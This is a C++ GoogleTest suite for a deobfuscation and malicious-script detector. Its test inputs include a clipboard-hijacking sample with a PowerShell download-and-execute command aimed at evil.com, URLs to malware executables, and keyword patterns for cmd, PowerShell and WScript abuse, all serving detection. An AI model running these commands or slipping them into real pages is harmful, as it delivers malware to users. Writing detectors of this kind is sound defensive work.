#include "pch.h"
#include <gtest/gtest.h>
#include "../core/StringDeobfuscator.h"

// ============================================================================
// Test Suite for isSensitiveFunctionName
// ============================================================================
class SensitiveFunctionNameTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(SensitiveFunctionNameTest, RecognizesSensitiveFunctions) {
    EXPECT_TRUE(StringDeobfuscator::isSensitiveFunctionName("fetch"));
    EXPECT_TRUE(StringDeobfuscator::isSensitiveFunctionName("eval"));
    EXPECT_TRUE(StringDeobfuscator::isSensitiveFunctionName("Function"));
    EXPECT_TRUE(StringDeobfuscator::isSensitiveFunctionName("XMLHttpRequest"));
    EXPECT_TRUE(StringDeobfuscator::isSensitiveFunctionName("setTimeout"));
    EXPECT_TRUE(StringDeobfuscator::isSensitiveFunctionName("document"));
    EXPECT_TRUE(StringDeobfuscator::isSensitiveFunctionName("atob"));
}

TEST_F(SensitiveFunctionNameTest, CaseInsensitive) {
    EXPECT_TRUE(StringDeobfuscator::isSensitiveFunctionName("FETCH"));
    EXPECT_TRUE(StringDeobfuscator::isSensitiveFunctionName("Eval"));
    EXPECT_TRUE(StringDeobfuscator::isSensitiveFunctionName("DoCuMeNt"));
}

TEST_F(SensitiveFunctionNameTest, RejectsNonSensitiveFunctions) {
    EXPECT_FALSE(StringDeobfuscator::isSensitiveFunctionName("console"));
    EXPECT_FALSE(StringDeobfuscator::isSensitiveFunctionName("log"));
    EXPECT_FALSE(StringDeobfuscator::isSensitiveFunctionName("myFunction"));
    EXPECT_FALSE(StringDeobfuscator::isSensitiveFunctionName(""));
}

// ============================================================================
// Test Suite for containsUrl
// ============================================================================
class UrlDetectionTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(UrlDetectionTest, DetectsHttpUrls) {
    EXPECT_TRUE(StringDeobfuscator::containsUrl("http://example.com"));
    EXPECT_TRUE(StringDeobfuscator::containsUrl("https://example.com"));
    EXPECT_TRUE(StringDeobfuscator::containsUrl("HTTP://EXAMPLE.COM"));
}

TEST_F(UrlDetectionTest, DetectsProtocolRelativeUrls) {
    EXPECT_TRUE(StringDeobfuscator::containsUrl("//example.com"));
}

TEST_F(UrlDetectionTest, DetectsDomainExtensions) {
    EXPECT_TRUE(StringDeobfuscator::containsUrl("example.com"));
    EXPECT_TRUE(StringDeobfuscator::containsUrl("test.org"));
    EXPECT_TRUE(StringDeobfuscator::containsUrl("website.net"));
}

TEST_F(UrlDetectionTest, RejectsTooShortStrings) {
    EXPECT_FALSE(StringDeobfuscator::containsUrl("http"));
    EXPECT_FALSE(StringDeobfuscator::containsUrl(""));
    EXPECT_FALSE(StringDeobfuscator::containsUrl("com"));
}

TEST_F(UrlDetectionTest, RejectsNonUrlStrings) {
    EXPECT_FALSE(StringDeobfuscator::containsUrl("just some text"));
    EXPECT_FALSE(StringDeobfuscator::containsUrl("function"));
}

// ============================================================================
// Test Suite for XOR decoding
// ============================================================================
class XorDecodingTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(XorDecodingTest, BasicXorDecoding) {
    std::string original = "test";
    std::string encoded;
    int key = 0x42;
    
    for (char c : original) {
        encoded += static_cast<char>(c ^ key);
    }
    
    std::string decoded = StringDeobfuscator::tryXorDecode(encoded, key);
    EXPECT_EQ(decoded, original);
}

TEST_F(XorDecodingTest, EmptyStringHandling) {
    std::string decoded = StringDeobfuscator::tryXorDecode("", 0x42);
    EXPECT_EQ(decoded, "");
}

TEST_F(XorDecodingTest, CommonKeysDecoding) {
    std::string plaintext = "http://malicious.com";
    std::string encoded;
    int key = 0x69;
    
    for (char c : plaintext) {
        encoded += static_cast<char>(c ^ key);
    }
    
    std::vector<std::string> results = StringDeobfuscator::tryCommonXorKeys(encoded);
    EXPECT_GT(results.size(), 0);
}

// ============================================================================
// Test Suite for Hex encoding
// ============================================================================
class HexEncodingTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(HexEncodingTest, RecognizesHexStrings) {
    EXPECT_TRUE(StringDeobfuscator::looksLikeHex("48656c6c6f"));
    EXPECT_TRUE(StringDeobfuscator::looksLikeHex("DEADBEEF"));
    EXPECT_TRUE(StringDeobfuscator::looksLikeHex("0123456789ABCDEF"));
}

TEST_F(HexEncodingTest, RejectsNonHexStrings) {
    EXPECT_FALSE(StringDeobfuscator::looksLikeHex("Hello"));
    EXPECT_FALSE(StringDeobfuscator::looksLikeHex("GHIJKL"));
    EXPECT_FALSE(StringDeobfuscator::looksLikeHex(""));
}

TEST_F(HexEncodingTest, RejectsOddLengthStrings) {
    EXPECT_FALSE(StringDeobfuscator::looksLikeHex("ABC"));
    EXPECT_FALSE(StringDeobfuscator::looksLikeHex("12345"));
}

TEST_F(HexEncodingTest, DecodesHexCorrectly) {
    std::string hex = "48656c6c6f";
    std::string decoded = StringDeobfuscator::decodeHex(hex);
    EXPECT_EQ(decoded, "Hello");
}

TEST_F(HexEncodingTest, HandlesInvalidHex) {
    std::string invalidHex = "ZZ";
    std::string decoded = StringDeobfuscator::decodeHex(invalidHex);
    EXPECT_EQ(decoded, "");
}

// ============================================================================
// Test Suite for Base64 detection
// ============================================================================
class Base64DetectionTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(Base64DetectionTest, RecognizesBase64Strings) {
    EXPECT_TRUE(StringDeobfuscator::looksLikeBase64("SGVsbG8gV29ybGQ="));
    EXPECT_TRUE(StringDeobfuscator::looksLikeBase64("dGVzdA=="));
    EXPECT_TRUE(StringDeobfuscator::looksLikeBase64("YWJjZA=="));
}

TEST_F(Base64DetectionTest, RecognizesBase64WithoutPadding) {
    EXPECT_TRUE(StringDeobfuscator::looksLikeBase64("SGVsbG8"));
}

TEST_F(Base64DetectionTest, RejectsNonBase64Strings) {
    EXPECT_FALSE(StringDeobfuscator::looksLikeBase64("Hello World!"));
    EXPECT_FALSE(StringDeobfuscator::looksLikeBase64(""));
    EXPECT_FALSE(StringDeobfuscator::looksLikeBase64("a"));
}

// ============================================================================
// Test Suite for String reversal
// ============================================================================
class StringReversalTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(StringReversalTest, ReversesSensitiveFunctions) {
    std::string reversed = StringDeobfuscator::tryReverse("lave");
    EXPECT_EQ(reversed, "eval");
}

TEST_F(StringReversalTest, ReversesUrls) {
    std::string url = "moc.elpmaxe//:ptth";
    std::string reversed = StringDeobfuscator::tryReverse(url);
    EXPECT_FALSE(reversed.empty());
    EXPECT_TRUE(StringDeobfuscator::containsUrl(reversed));
}

TEST_F(StringReversalTest, ReturnsEmptyForNonSuspicious) {
    std::string reversed = StringDeobfuscator::tryReverse("olleh");
    EXPECT_EQ(reversed, "");
}

TEST_F(StringReversalTest, HandlesTooShortStrings) {
    EXPECT_EQ(StringDeobfuscator::tryReverse("ab"), "");
    EXPECT_EQ(StringDeobfuscator::tryReverse(""), "");
}

// ============================================================================
// Test Suite for Clipboard hijacking detection
// ============================================================================
class ClipboardHijackingTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(ClipboardHijackingTest, DetectsClipboardAPIWithMaliciousCommand) {
    std::string code = "navigator.clipboard.writeText('cmd /c malicious');";
    EXPECT_TRUE(StringDeobfuscator::containsClipboardHijacking(code));
}

TEST_F(ClipboardHijackingTest, DetectsClipboardAPIWithPowerShell) {
    std::string code = "clipboard.write('powershell -Command evil');";
    EXPECT_TRUE(StringDeobfuscator::containsClipboardHijacking(code));
}

TEST_F(ClipboardHijackingTest, DetectsClipboardAPIWithScriptInjection) {
    std::string code = "navigator.clipboard.writeText('eval(maliciousCode)');";
    EXPECT_TRUE(StringDeobfuscator::containsClipboardHijacking(code));
}

TEST_F(ClipboardHijackingTest, AllowsBenignClipboardUsage) {
    std::string code = "navigator.clipboard.writeText('Hello World');";
    EXPECT_FALSE(StringDeobfuscator::containsClipboardHijacking(code));
}

TEST_F(ClipboardHijackingTest, ReturnsFalseForEmptyString) {
    EXPECT_FALSE(StringDeobfuscator::containsClipboardHijacking(""));
}

// ============================================================================
// Test Suite for Malicious command detection
// ============================================================================
class MaliciousCommandTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(MaliciousCommandTest, DetectsWindowsCommands) {
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("cmd /c dir"));
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("cmd.exe something"));
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("powershell -Command"));
}

TEST_F(MaliciousCommandTest, DetectsScriptingEngines) {
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("wscript test.vbs"));
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("cscript malware.js"));
}

TEST_F(MaliciousCommandTest, DetectsActiveXObjects) {
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("CreateObject('WScript.Shell')"));
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("MSXML2.XMLHTTP"));
}

TEST_F(MaliciousCommandTest, DetectsPowerShellPatterns) {
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("Invoke-Expression"));
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("IEX (New-Object)"));
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("DownloadString"));
}

TEST_F(MaliciousCommandTest, DetectsEnvironmentVariables) {
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("%temp%\\malware.exe"));
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("$env:temp"));
}

TEST_F(MaliciousCommandTest, CaseInsensitiveDetection) {
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("CMD /C"));
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand("PowerShell"));
}

TEST_F(MaliciousCommandTest, ReturnsFalseForBenignStrings) {
    EXPECT_FALSE(StringDeobfuscator::containsMaliciousCommand("hello world"));
    EXPECT_FALSE(StringDeobfuscator::containsMaliciousCommand(""));
}

// ============================================================================
// Test Suite for Script injection detection
// ============================================================================
class ScriptInjectionTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(ScriptInjectionTest, DetectsEvalInjection) {
    EXPECT_TRUE(StringDeobfuscator::containsScriptInjection("eval(maliciousCode)"));
    EXPECT_TRUE(StringDeobfuscator::containsScriptInjection("EVAL(code)"));
}

TEST_F(ScriptInjectionTest, DetectsFunctionConstructor) {
    EXPECT_TRUE(StringDeobfuscator::containsScriptInjection("Function('return this')()"));
}

TEST_F(ScriptInjectionTest, DetectsDocumentWrite) {
    EXPECT_TRUE(StringDeobfuscator::containsScriptInjection("document.write('<script>'));
}

TEST_F(ScriptInjectionTest, DetectsInnerHTML) {
    EXPECT_TRUE(StringDeobfuscator::containsScriptInjection("element.innerHTML = '<script>'"));
    EXPECT_TRUE(StringDeobfuscator::containsScriptInjection("outerHTML = malicious"));
}

TEST_F(ScriptInjectionTest, DetectsTimerFunctions) {
    EXPECT_TRUE(StringDeobfuscator::containsScriptInjection("setTimeout('eval(x)', 1000)"));
    EXPECT_TRUE(StringDeobfuscator::containsScriptInjection("setInterval(malicious)"));
}

TEST_F(ScriptInjectionTest, DetectsExecuteMethod) {
    EXPECT_TRUE(StringDeobfuscator::containsScriptInjection("Execute(code)"));
    EXPECT_TRUE(StringDeobfuscator::containsScriptInjection(".ResponseText"));
}

TEST_F(ScriptInjectionTest, CaseInsensitiveDetection) {
    EXPECT_TRUE(StringDeobfuscator::containsScriptInjection("EVAL("));
    EXPECT_TRUE(StringDeobfuscator::containsScriptInjection("SetTimeout("));
}

TEST_F(ScriptInjectionTest, ReturnsFalseForBenignCode) {
    EXPECT_FALSE(StringDeobfuscator::containsScriptInjection("console.log('test')"));
    EXPECT_FALSE(StringDeobfuscator::containsScriptInjection(""));
}

// ============================================================================
// Test Suite for String literal extraction
// ============================================================================
class StringLiteralExtractionTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(StringLiteralExtractionTest, ExtractsDoubleQuotedStrings) {
    std::string code = R"(var x = "hello"; var y = "world";)";
    auto literals = StringDeobfuscator::extractStringLiterals(code);
    EXPECT_GE(literals.size(), 2);
}

TEST_F(StringLiteralExtractionTest, ExtractsSingleQuotedStrings) {
    std::string code = R"(var x = 'hello'; var y = 'world';)";
    auto literals = StringDeobfuscator::extractStringLiterals(code);
    EXPECT_GE(literals.size(), 2);
}

TEST_F(StringLiteralExtractionTest, HandlesEscapedQuotes) {
    std::string code = R"(var x = "He said \"hello\"";)";
    auto literals = StringDeobfuscator::extractStringLiterals(code);
    EXPECT_GE(literals.size(), 1);
}

TEST_F(StringLiteralExtractionTest, HandlesEmptyCode) {
    std::string code = "";
    auto literals = StringDeobfuscator::extractStringLiterals(code);
    EXPECT_EQ(literals.size(), 0);
}

TEST_F(StringLiteralExtractionTest, HandlesMixedQuotes) {
    std::string code = R"(var x = "double"; var y = 'single';)";
    auto literals = StringDeobfuscator::extractStringLiterals(code);
    EXPECT_GE(literals.size(), 2);
}

// ============================================================================
// Test Suite for Clipboard API detection
// ============================================================================
class ClipboardAPIDetectionTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(ClipboardAPIDetectionTest, DetectsNavigatorClipboard) {
    EXPECT_TRUE(StringDeobfuscator::containsClipboardAPI("navigator.clipboard.writeText()"));
    EXPECT_TRUE(StringDeobfuscator::containsClipboardAPI("NAVIGATOR.CLIPBOARD.readText()"));
}

TEST_F(ClipboardAPIDetectionTest, DetectsClipboardMethods) {
    EXPECT_TRUE(StringDeobfuscator::containsClipboardAPI("clipboard.writeText('test')"));
    EXPECT_TRUE(StringDeobfuscator::containsClipboardAPI("clipboard.write(data)"));
    EXPECT_TRUE(StringDeobfuscator::containsClipboardAPI("clipboard.readText()"));
    EXPECT_TRUE(StringDeobfuscator::containsClipboardAPI("clipboard.read()"));
}

TEST_F(ClipboardAPIDetectionTest, CaseInsensitive) {
    EXPECT_TRUE(StringDeobfuscator::containsClipboardAPI("CLIPBOARD.WRITETEXT"));
}

TEST_F(ClipboardAPIDetectionTest, ReturnsFalseForNonClipboardCode) {
    EXPECT_FALSE(StringDeobfuscator::containsClipboardAPI("console.log('test')"));
    EXPECT_FALSE(StringDeobfuscator::containsClipboardAPI(""));
}

// ============================================================================
// Test Suite for Remote malicious file detection
// ============================================================================
class RemoteMaliciousFileTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(RemoteMaliciousFileTest, DetectsHttpUrlWithExecutable) {
    EXPECT_TRUE(StringDeobfuscator::containsRemoteMaliciousFile("http://evil.com/malware.exe"));
    EXPECT_TRUE(StringDeobfuscator::containsRemoteMaliciousFile("https://bad.org/virus.dll"));
}

TEST_F(RemoteMaliciousFileTest, DetectsScriptFiles) {
    EXPECT_TRUE(StringDeobfuscator::containsRemoteMaliciousFile("http://evil.com/malware.vbs"));
    EXPECT_TRUE(StringDeobfuscator::containsRemoteMaliciousFile("https://bad.org/script.bat"));
    EXPECT_TRUE(StringDeobfuscator::containsRemoteMaliciousFile("http://test.com/evil.ps1"));
    EXPECT_TRUE(StringDeobfuscator::containsRemoteMaliciousFile("https://example.com/bad.js"));
}

TEST_F(RemoteMaliciousFileTest, DetectsCommandFiles) {
    EXPECT_TRUE(StringDeobfuscator::containsRemoteMaliciousFile("http://evil.com/run.cmd"));
    EXPECT_TRUE(StringDeobfuscator::containsRemoteMaliciousFile("https://bad.org/screen.scr"));
}

TEST_F(RemoteMaliciousFileTest, DetectsJarFiles) {
    EXPECT_TRUE(StringDeobfuscator::containsRemoteMaliciousFile("http://evil.com/malware.jar"));
}

TEST_F(RemoteMaliciousFileTest, CaseInsensitiveExtensionCheck) {
    EXPECT_TRUE(StringDeobfuscator::containsRemoteMaliciousFile("http://evil.com/MALWARE.EXE"));
    EXPECT_TRUE(StringDeobfuscator::containsRemoteMaliciousFile("https://bad.org/Script.VBS"));
}

TEST_F(RemoteMaliciousFileTest, RequiresUrl) {
    EXPECT_FALSE(StringDeobfuscator::containsRemoteMaliciousFile("malware.exe"));
    EXPECT_FALSE(StringDeobfuscator::containsRemoteMaliciousFile("local.vbs"));
}

TEST_F(RemoteMaliciousFileTest, AllowsBenignUrls) {
    EXPECT_FALSE(StringDeobfuscator::containsRemoteMaliciousFile("http://example.com/image.png"));
    EXPECT_FALSE(StringDeobfuscator::containsRemoteMaliciousFile("https://site.org/data.json"));
}

TEST_F(RemoteMaliciousFileTest, HandlesTooShortStrings) {
    EXPECT_FALSE(StringDeobfuscator::containsRemoteMaliciousFile(""));
    EXPECT_FALSE(StringDeobfuscator::containsRemoteMaliciousFile("short"));
}

TEST_F(RemoteMaliciousFileTest, HandlesUrlWithoutDangerousExtension) {
    EXPECT_FALSE(StringDeobfuscator::containsRemoteMaliciousFile("http://example.com/file.txt"));
    EXPECT_FALSE(StringDeobfuscator::containsRemoteMaliciousFile("https://site.org/page.html"));
}

// ============================================================================
// Integration Tests - Complex scenarios
// ============================================================================
class IntegrationTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(IntegrationTest, DetectsObfuscatedMaliciousUrl) {
    std::string hexUrl = "687474703a2f2f6576696c2e636f6d";
    
    if (StringDeobfuscator::looksLikeHex(hexUrl)) {
        std::string decoded = StringDeobfuscator::decodeHex(hexUrl);
        EXPECT_TRUE(StringDeobfuscator::containsUrl(decoded));
    }
}

TEST_F(IntegrationTest, DetectsReversedSensitiveFunction) {
    std::string reversed = "lave";
    std::string original = StringDeobfuscator::tryReverse(reversed);
    
    if (!original.empty()) {
        EXPECT_TRUE(StringDeobfuscator::isSensitiveFunctionName(original));
    }
}

TEST_F(IntegrationTest, DetectsComplexClipboardHijacking) {
    std::string maliciousCode = R"(
        navigator.clipboard.writeText('powershell -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/malware.ps1\')"');
    )";
    
    EXPECT_TRUE(StringDeobfuscator::containsClipboardAPI(maliciousCode));
    EXPECT_TRUE(StringDeobfuscator::containsClipboardHijacking(maliciousCode));
    EXPECT_TRUE(StringDeobfuscator::containsMaliciousCommand(maliciousCode));
}

TEST_F(IntegrationTest, ExtractsAndAnalyzesStringLiterals) {
    std::string code = R"(
        var cmd = "cmd /c dir";
        var url = "http://evil.com/malware.exe";
        eval("malicious code");
    )";
    
    auto literals = StringDeobfuscator::extractStringLiterals(code);
    EXPECT_GT(literals.size(), 0);
    
    bool foundMalicious = false;
    for (const auto& literal : literals) {
        if (StringDeobfuscator::containsMaliciousCommand(literal) ||
            StringDeobfuscator::containsRemoteMaliciousFile(literal)) {
            foundMalicious = true;
            break;
        }
    }
    EXPECT_TRUE(foundMalicious);
}

// ============================================================================
// Edge Cases and Error Handling
// ============================================================================
class EdgeCaseTest : public ::testing::Test {
protected:
    void SetUp() override {}
    void TearDown() override {}
};

TEST_F(EdgeCaseTest, HandlesNullAndEmptyStrings) {
    EXPECT_FALSE(StringDeobfuscator::isSensitiveFunctionName(""));
    EXPECT_FALSE(StringDeobfuscator::containsUrl(""));
    EXPECT_FALSE(StringDeobfuscator::containsMaliciousCommand(""));
    EXPECT_FALSE(StringDeobfuscator::containsScriptInjection(""));
    EXPECT_FALSE(StringDeobfuscator::containsClipboardHijacking(""));
}

TEST_F(EdgeCaseTest, HandlesVeryLongStrings) {
    std::string longString(10000, 'a');
    EXPECT_NO_THROW(StringDeobfuscator::isSensitiveFunctionName(longString));
    EXPECT_NO_THROW(StringDeobfuscator::containsUrl(longString));
}

TEST_F(EdgeCaseTest, HandlesSpecialCharacters) {
    std::string special = "!@#$%^&*()_+-=[]{}|;':\",./<>?";
    EXPECT_NO_THROW(StringDeobfuscator::containsMaliciousCommand(special));
    EXPECT_NO_THROW(StringDeobfuscator::containsScriptInjection(special));
}

TEST_F(EdgeCaseTest, HandlesUnicodeCharacters) {
    std::string unicode = "안녕하세요 世界 🌍";
    EXPECT_NO_THROW(StringDeobfuscator::isSensitiveFunctionName(unicode));
    EXPECT_NO_THROW(StringDeobfuscator::containsUrl(unicode));
}

TEST_F(EdgeCaseTest, HandlesWhitespaceOnlyStrings) {
    EXPECT_FALSE(StringDeobfuscator::isSensitiveFunctionName("   "));
    EXPECT_FALSE(StringDeobfuscator::containsUrl("\t\n\r"));
}

// ============================================================================
// Main function
// ============================================================================
int main(int argc, char** argv) {
    ::testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}
